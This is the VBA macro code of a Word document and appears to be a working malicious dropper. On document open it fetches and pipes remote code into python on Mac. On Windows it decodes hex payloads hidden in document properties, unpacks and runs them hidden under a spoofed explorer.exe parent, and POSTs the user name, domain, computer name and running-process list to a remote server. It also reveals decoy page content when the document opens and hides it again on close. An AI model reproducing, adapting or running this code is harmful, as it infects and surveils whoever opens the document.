Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
#If Mac Then
Private Sub Document_Open()
    On Error Resume Next
    MacScript "do shell script ""(curl -s " & Read("M") & "?token=" & Read("ID") & "'&'dm | nohup python &>/dev/null &)"""
    ActiveDocument.Bookmarks("Page1").Range.Font.Hidden = False
End Sub

#Else

Option Explicit
Const TypeBinary = 1
Const ForReading = 1, ForWriting = 2, ForAppending = 8

Private Type PROCESSENTRY32
dwSize As Long
cntUsage As Long
th32ProcessID As Long
th32DefaultHeapID As Long
th32ModuleID As Long
cntThreads As Long
th32ParentProcessID As Long
pcPriClassBase As Long
dwFlags As Long
szexeFile As String * 260
End Type

#If VBA7 And Win64 Then

Private Type PROCESS_INFORMATION
    hProcess As LongPtr
    hThread As LongPtr
    dwProcessId As Long
    dwThreadId As Long
End Type

Private Type STARTUP_INFO
    cb As Long
    lpReserved As String
    lpDesktop As String
    lpTitle As String
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Byte
    hStdInput As LongPtr
    hStdOutput As LongPtr
    hStdError As LongPtr
End Type

Private Type STARTUPINFOEX
 STARTUPINFO As STARTUP_INFO
 lpAttributelist As LongPtr
End Type

Private Declare PtrSafe Function CreateProcess Lib "kernel32" _
Alias "CreateProcessA" (ByVal lpApplicationName As String, _
ByVal lpCommandLine As String, _
lpProcessAttributes As Long, _
lpThreadAttributes As Long, _
ByVal bInheritHandles As Long, _
ByVal dwCreationFlags As Long, _
lpEnvironment As Any, _
ByVal lpCurrentDriectory As String, _
ByVal lpStartupInfo As LongPtr, _
lpProcessInformation As PROCESS_INFORMATION) As Long
                                
Private Declare PtrSafe Function OpenProcess Lib "kernel32.dll" _
 (ByVal dwAccess As Long, _
 ByVal fInherit As Integer, _
 ByVal hObject As Long) As Long

Private Declare PtrSafe Function CreateToolhelp32Snapshot Lib "kernel32.dll" _
 (ByVal dwFlags As Integer, _
 ByVal th32ProcessID As Integer) As Long

Private Declare PtrSafe Function Process32First Lib "kernel32.dll" _
 (ByVal hSnapshot As LongPtr, _
 ByRef lppe As PROCESSENTRY32) As Boolean
 
Private Declare PtrSafe Function Process32Next Lib "kernel32.dll" _
 (ByVal hSnapshot As LongPtr, _
 ByRef lppe As PROCESSENTRY32) As Boolean
 
Private Declare PtrSafe Function HeapAlloc Lib "kernel32" _
(ByVal hHeap As LongPtr, ByVal dwFlags As Long, _
ByVal dwBytes As Long) As LongPtr
 
Private Declare PtrSafe Function GetProcessHeap Lib "kernel32" () As LongPtr

Private Declare PtrSafe Function CloseHandle Lib "kernel32" _
 (ByVal hObject As LongPtr) As Long
 
Private Declare PtrSafe Function InitializeProcThreadAttributeList Lib "kernel32" _
 (ByVal lpAttributelist As LongPtr, _
 ByVal dwAttributeCount As Integer, _
 ByVal dwFlags As Integer, _
 ByRef lpSize As Integer) As Boolean

Private Declare PtrSafe Function UpdateProcThreadAttribute Lib "kernel32" _
 (ByVal lpAttributelist As LongPtr, _
 ByVal dwFlags As Integer, _
 ByVal lpAttribute As Long, _
 ByRef lpValue As Long, _
 ByVal cbSize As Integer, _
 ByRef lpPreviousValue As Integer, _
 ByRef lpReturnSize As Integer) As Boolean

#Else

Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessId As Long
    dwThreadId As Long
End Type

Private Type STARTUP_INFO
 cb As Long
 lpReserved As String
 lpDesktop As String
 lpTitle As String
 dwX As Long
 dwY As Long
 dwXSize As Long
 dwYSize As Long
 dwXCountChars As Long
 dwYCountChars As Long
 dwFillAttribute As Long
 dwFlags As Long
 wShowWindow As Integer
 cbReserved2 As Integer
 lpReserved2 As Long
 hStdInput As Long
 hStdOutput As Long
 hStdError As Long
End Type

Private Type STARTUPINFOEX
 STARTUPINFO As STARTUP_INFO
 lpAttributelist As Long
End Type

Private Declare Function CreateProcess Lib "kernel32" _
 Alias "CreateProcessA" _
 (ByVal lpApplicationName As String, _
 ByVal lpCommandLine As String, _
 lpProcessAttributes As Any, _
 lpThreadAttributes As Any, _
 ByVal bInheritHandles As Long, _
 ByVal dwCreationFlags As Long, _
 lpEnvironment As Any, _
 ByVal lpCurrentDriectory As String, _
 ByVal lpStartupInfo As Long, _
 lpProcessInformation As PROCESS_INFORMATION) As Long

Private Declare Function OpenProcess Lib "kernel32.dll" _
 (ByVal dwAccess As Long, _
 ByVal fInherit As Integer, _
 ByVal hObject As Long) As Long

Private Declare Function CreateToolhelp32Snapshot Lib "kernel32.dll" _
 (ByVal dwFlags As Integer, _
 ByVal th32ProcessID As Integer) As Long

Private Declare Function Process32First Lib "kernel32.dll" _
 (ByVal hSnapshot As Long, _
 ByRef lppe As PROCESSENTRY32) As Boolean
 
Private Declare Function Process32Next Lib "kernel32.dll" _
 (ByVal hSnapshot As Long, _
 ByRef lppe As PROCESSENTRY32) As Boolean
 
Private Declare Function HeapAlloc Lib "kernel32" _
(ByVal hHeap As Long, ByVal dwFlags As Long, _
ByVal dwBytes As Long) As Long
 
Private Declare Function GetProcessHeap Lib "kernel32" () As Long

Private Declare Function CloseHandle Lib "kernel32" _
 (ByVal hObject As Long) As Long
 
Private Declare Function InitializeProcThreadAttributeList Lib "kernel32" _
 (ByVal lpAttributelist As Long, _
 ByVal dwAttributeCount As Integer, _
 ByVal dwFlags As Integer, _
 ByRef lpSize As Integer) As Boolean

Private Declare Function UpdateProcThreadAttribute Lib "kernel32" _
 (ByVal lpAttributelist As Long, _
 ByVal dwFlags As Integer, _
 ByVal lpAttribute As Long, _
 ByRef lpValue As Long, _
 ByVal cbSize As Integer, _
 ByRef lpPreviousValue As Integer, _
 ByRef lpReturnSize As Integer) As Boolean
 
 #End If

Const SYNCHRONIZE = 1048576
Const NORMAL_PRIORITY_CLASS = &H20&
Const CREATE_NO_WINDOW = &H8000000
Const EXTENDED_STARTUPINFO_PRESENT = &H80000
Const TH32CS_SNAPPROCESS = &H2&
Const HEAP_ZERO_MEMORY = &H8&
Const STARTF_USESHOWWINDOW = &H1&
Const SW_HIDE = &H0&
Const PROCESS_ALL_ACCESS = &H1F0FFF
Const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = &H20000

Private Sub Document_Open()
    On Error Resume Next
    
    Dim WshShell
    Dim WshProcEnv
    Dim system_architecture
    Dim process_architecture

    Set WshShell = CreateObject("WScript.Shell")
    Set WshProcEnv = WshShell.Environment("Process")

    process_architecture = WshProcEnv("PROCESSOR_ARCHITECTURE")

    If process_architecture = "x86" Then
        system_architecture = WshProcEnv("PROCESSOR_ARCHITEW6432")

        If system_architecture = "" Then
            system_architecture = "x86"
        End If
    Else
        system_architecture = process_architecture
    End If

    Const TypeBinary = 1, ForReading = 1, ForWriting = 2, ForAppending = 8

    Dim var64, var86
    Dim d As String
    d = Read("Hyperlink Base")
    Dim da() As String
    da = Split(d, "|", 2)
    var64 = da(0)
    var86 = da(1)

    Dim outFile1, outFile2, decoded, Gedvv2, newFolder, random_num, dir1, dir2, com

    Randomize
    random_num = Int((25678 - (23 - 1)) * Rnd()) + 23
    newFolder = Trim(Str(random_num))
    
    dir1 = Environ("APPDATA") & Read("OD")
    dir2 = Environ("APPDATA") & Read("OD") & "\{" & newFolder & "}"
    
    If Len(Dir(dir1, vbDirectory)) = 0 Then
        MkDir dir1
    End If
    
    If Len(Dir(dir2, vbDirectory)) = 0 Then
        MkDir dir2
    End If
    
    ChDrive (dir2)
    ChDir (dir2)
    outFile1 = dir2 & "\" & Read("OF") & ".zip"
    outFile2 = dir2 & "\" & Read("OF") & ".pkg"

    Dim pInfo As PROCESS_INFORMATION
    Dim sInfo As STARTUPINFOEX
    Dim sNull As String
    Dim pid, r As Integer
    Dim threadAttribSize As Integer

#If VBA7 And Win64 Then
    Dim hProcess As LongPtr
#Else
    Dim hProcess As Long
#End If

    r = InitializeProcThreadAttributeList(ByVal 0&, 1, 0, threadAttribSize)
    sInfo.lpAttributelist = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, threadAttribSize)
    r = InitializeProcThreadAttributeList(sInfo.lpAttributelist, 1, 0, threadAttribSize)
    pid = GP("explorer.exe")
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    r = UpdateProcThreadAttribute(sInfo.lpAttributelist, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, hProcess, Len(hProcess), ByVal 0&, ByVal 0&)
    sInfo.STARTUPINFO.cb = LenB(sInfo)
    sInfo.STARTUPINFO.dwFlags = 1
    sInfo.STARTUPINFO.wShowWindow = SW_HIDE
    
    If system_architecture = "AMD64" Then
        decoded = DH(var64)
        WB outFile1, decoded
        UZ dir2, outFile1
        com = Read("IU6") & " " & outFile2
    Else
        decoded = DH(var86)
        WB outFile1, decoded
        UZ dir2, outFile1
        com = Read("IU3") & " " & outFile2
    End If

    r = CreateProcess(sNull, com, ByVal 0&, ByVal 0&, 1&, EXTENDED_STARTUPINFO_PRESENT, ByVal 0&, sNull, VarPtr(sInfo), pInfo)
    Dim blah As Long
    blah = err.LastDllError
    Dim objHTTP, res
    Set objHTTP = CreateObject("MSXML2.XMLHTTP")
    objHTTP.Open "POST", Read("M"), False
    objHTTP.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
    objHTTP.setRequestHeader "Content-type", "application/x-www-form-urlencoded"
    Dim ba() As Byte
    ba = StrConv(Gather(), vbFromUnicode)
    objHTTP.send ("&token=" & Read("ID") & "&session=" & EH(ba))
    res = objHTTP.responseText
    Set objHTTP = Nothing
    Set res = Nothing
    ActiveDocument.Bookmarks("Page1").Range.Font.Hidden = False
End Sub

Function Gather() As String
    On Error Resume Next
    Dim computer As String
    computer = "."
    Dim objWMIService, colProcessList As Object
    Set objWMIService = GetObject("winmgmts:\\" & computer & "\root\cimv2")
    Set colProcessList = objWMIService.ExecQuery _
        ("SELECT * FROM Win32_Process")
    Dim result As String
    result = Environ("ComputerName") & vbNewLine & Environ("UserDomain") & "\" & Environ("Username") & vbNewLine
    Dim objProcess As Object
    For Each objProcess In colProcessList
        If Len(objProcess.ExecutablePath) > 0 Then
            result = result & objProcess.ExecutablePath & vbNewLine
        ElseIf Len(objProcess.name) > 0 Then
            result = result & objProcess.name & vbNewLine
        End If
    Next
    Gather = result
End Function
   
Sub UZ(strTargetPath, Fname)
    On Error Resume Next
    Dim oApp As Object
    Dim FileNameFolder As Variant
    If Right(strTargetPath, 1) <> Application.PathSeparator Then
        strTargetPath = strTargetPath & Application.PathSeparator
    End If
    FileNameFolder = strTargetPath
    Set oApp = CreateObject("Shell.Application")
    oApp.Namespace(FileNameFolder).CopyHere oApp.Namespace(Fname).items
End Sub

Private Function DH(hex)
    On Error Resume Next
    Dim DM, EL
    Set DM = CreateObject("Microsoft.XMLDOM")
    Set EL = DM.createElement("tmp")
    EL.dataType = "bin.hex"
    EL.Text = hex
    DH = EL.nodeTypedValue
End Function

Private Function EH(bytes)
    On Error Resume Next
    Dim DM, EL
    Set DM = CreateObject("Microsoft.XMLDOM")
    Set EL = DM.createElement("tmp")
    EL.dataType = "bin.hex"
    EL.nodeTypedValue = bytes
    EH = EL.Text
End Function

Private Sub WB(file, bytes)
    On Error Resume Next
    Dim binaryStream
    Set binaryStream = CreateObject("ADODB.Stream")
    binaryStream.Type = TypeBinary
    binaryStream.Open
    binaryStream.Write bytes
    binaryStream.SaveToFile file, ForWriting
End Sub

Private Function GP(ByVal name As String)
    Dim tPid As Integer
    Dim pEntry As PROCESSENTRY32
    Dim RProcessFound As Boolean
    pEntry.dwSize = Len(pEntry)
    
#If VBA7 And Win64 Then
    Dim snapshot As LongPtr
#Else
    Dim snapshot As Long
#End If
    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, ByVal 0&)

    RProcessFound = Process32First(snapshot, pEntry)

    Do
        If Left$(pEntry.szexeFile, Len(name)) = LCase$(name) Then
            GP = pEntry.th32ProcessID
            RProcessFound = False
        Else
            RProcessFound = Process32Next(snapshot, pEntry)
        End If
    Loop While RProcessFound
End Function

Private Sub Document_Close()
    On Error Resume Next
    ActiveDocument.Bookmarks("Page1").Range.Font.Hidden = True
    Documents.Save NoPrompt:=True
End Sub
#End If

Function Read(sPropName As String) As Variant

Dim bCustom As Boolean
Dim sValue As String

  On Error GoTo ErrHandlerRead
  sValue = ActiveDocument.BuiltInDocumentProperties(sPropName).Value
  Read = sValue
  Exit Function

ContinueCustom:
  bCustom = True

Custom:
  sValue = ActiveDocument.CustomDocumentProperties(sPropName).Value
  Read = sValue
  Exit Function

ErrHandlerRead:
  err.Clear
  If Not bCustom Then
    Resume ContinueCustom
  Else
    Read = ""
    Exit Function
  End If

End Function

